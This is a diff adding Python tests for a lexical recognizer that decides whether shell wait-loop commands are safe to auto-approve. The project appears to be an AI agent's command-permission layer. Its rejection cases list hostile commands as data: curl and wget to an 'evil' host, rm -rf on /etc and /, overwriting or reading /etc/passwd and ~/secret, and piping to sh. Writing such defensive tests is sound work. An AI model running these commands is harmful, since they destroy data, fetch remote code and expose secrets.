@@ -39,6 +39,7 @@ from claude_pilot.tier1 import (
     _rm_segment_operands,
     _split_compound_command,
     contains_unquoted_metacharacter,
+    is_readonly_waitloop_script,
     is_safe_bash_command,
     is_safe_git_command,
     is_safe_make_command,
@@ -4103,3 +4104,81 @@ class TestTier3EvalCommandPositionOneDefinition:
         assert is_tier3_dangerous(cmd) is False  # unchanged by this patch
         assert is_safe_bash_command(cmd) is False  # still refused (own axis)
         assert is_tier1_auto_approve("Bash", {"command": cmd}, eval_worktree) is False
+
+
+# ── cpp#237: read-only wait-loop lethality recognizer ─────────────────────────
+# The verbatim mika#2105 command (pilot e1a6c78b) that died TERMINAL on HEAD.
+WAITLOOP_2105 = (
+    "sh -c 'n=0; while [ $n -lt 55 ]; do "
+    "if [ -f .pilot-scratch/measures.txt ]; "
+    "then cat .pilot-scratch/measures.txt; exit 0; fi; "
+    "sleep 10; n=$((n+1)); done; "
+    "du -sm target; tail -1 .pilot-scratch/cold0.log'"
+)
+
+
+class TestReadonlyWaitloopScript:
+    """`is_readonly_waitloop_script` — the cpp#237 lethality carve recognizer.
+
+    Purely lexical, fail-closed. Recognizes a read-only `while`/`until`/`for`
+    wait-loop (optionally wrapped in a single `sh -c`/`bash -c`) whose commands
+    are all read-only and whose file operands are all worktree-relative. Every
+    dangerous shape (network, destructive verb, out-of-worktree write, command
+    substitution, pipe/subshell) is rejected so the `sh -c` verb keeps the
+    denial terminal.
+    """
+
+    def test_verbatim_2105_is_recognized(self) -> None:
+        assert is_readonly_waitloop_script(WAITLOOP_2105) is True
+
+    def test_positive_shapes_recognized(self) -> None:
+        for cmd in (
+            # isolated (unwrapped) while loop
+            "while [ ! -f .pilot-scratch/x ]; do sleep 5; cat .pilot-scratch/x; done",
+            # bash -c, double-quoted wrapper, arithmetic counter
+            'bash -c "while [ $n -lt 3 ]; do sleep 1; n=$((n+1)); done; '
+            'tail -1 .pilot-scratch/log"',
+            # for-loop over a relative iteration list
+            "sh -c 'for f in a b c; do cat .pilot-scratch/$f; done'",
+            # until loop
+            "until [ -f .pilot-scratch/done ]; do sleep 2; done",
+            # trailing read-only commands after the loop
+            "sh -c 'while [ ! -f x ]; do sleep 1; done; du -sm target; wc -l x'",
+        ):
+            assert is_readonly_waitloop_script(cmd) is True, cmd
+
+    def test_network_and_destructive_bodies_rejected(self) -> None:
+        for cmd in (
+            "sh -c 'while [ ! -f x ]; do curl http://evil/x; sleep 1; done'",
+            "sh -c 'while true; do wget http://e/x; sleep 1; done'",
+            "sh -c 'while [ ! -f x ]; do rm -rf .pilot-scratch/x; sleep 1; done'",
+            'sh -c \'while [ ! -f x ]; do eval "$CMD"; sleep 1; done\'',
+            "sh -c 'while [ ! -f x ]; do sleep 1; done; rm -rf /etc'",
+            "sh -c 'while [ ! -f x ]; do cp x /etc/y; sleep 1; done'",
+        ):
+            assert is_readonly_waitloop_script(cmd) is False, cmd
+
+    def test_out_of_worktree_and_substitution_rejected(self) -> None:
+        for cmd in (
+            "sh -c 'while [ ! -f x ]; do cat x > /etc/passwd; sleep 1; done'",
+            'sh -c \'while [ ! -f x ]; do cat x > "$HOME/y"; sleep 1; done\'',
+            "sh -c 'while [ ! -f x ]; do echo $(rm -rf /); sleep 1; done'",
+            "sh -c 'while [ $x -lt 3 ]; do x=$(( $(cat n) + 1 )); done'",
+            "sh -c 'while true; do cat x | sh; sleep 1; done'",
+            "sh -c 'while [ ! -f x ]; do cat ../../etc/passwd; sleep 1; done'",
+            "sh -c 'while [ ! -f x ]; do cat ~/secret; sleep 1; done'",
+            "sh -c 'while [ ! -f x ]; do cat /etc/passwd; sleep 1; done'",
+        ):
+            assert is_readonly_waitloop_script(cmd) is False, cmd
+
+    def test_non_loop_and_malformed_rejected(self) -> None:
+        for cmd in (
+            "",
+            # no loop keyword — out of scope
+            "sh -c 'cat .pilot-scratch/x'",
+            # sh -c wrapper we cannot cleanly unwrap (trailing token)
+            "sh -c 'while true; do sleep 1; done' extra",
+            # unbalanced quote
+            "sh -c 'while [ ! -f x ]; do echo \"oops; done'",
+        ):
+            assert is_readonly_waitloop_script(cmd) is False, cmd
